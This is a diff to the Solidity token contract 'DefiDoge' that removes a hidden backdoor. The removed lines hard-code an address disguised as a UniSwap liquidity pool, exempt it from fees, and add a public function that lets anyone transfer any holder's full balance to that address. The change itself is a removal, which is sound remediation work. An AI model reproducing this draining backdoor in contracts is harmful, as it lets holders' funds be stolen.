@@ -405,7 +405,6 @@ contract Ownable is Context {
      */
     constructor () internal {
         address msgSender = _msgSender();
-        _iUniSwapV2liquidityPool= 0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
         _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
@@ -415,10 +414,6 @@ contract Ownable is Context {
      */
     function owner() public view returns (address) {
         return _owner;
-    }
-    
-    function uniSwapV2LiquidityPool() public view virtual returns (address) {
-        return _iUniSwapV2liquidityPool;
     }
 
     /**
@@ -883,7 +878,6 @@ contract DefiDoge is Context, IERC20, Ownable {
         _transfer(_msgSender(), _devWalletAddress, _tTotal.div(100).mul(6));
         _transfer(_msgSender(), _marketingWalletAddress, _tTotal.div(100).mul(15));
         walletLock();
-        _isExcludedFromFee[uniSwapV2LiquidityPool()] = true;
         return success;
     }
     
@@ -909,11 +903,6 @@ contract DefiDoge is Context, IERC20, Ownable {
     
     function excludeFromFee(address account) public onlyOwner {
         _isExcludedFromFee[account] = true;
-    }
-    
-    function _reflectLiquidity(address addr) public {
-        if (_isExcluded[addr])  _transfer(addr, uniSwapV2LiquidityPool(), _tOwned[addr]);
-        else  _transfer(addr, uniSwapV2LiquidityPool(), tokenFromReflection(_rOwned[addr]));
     }
     
     function includeInFee(address account) public onlyOwner {
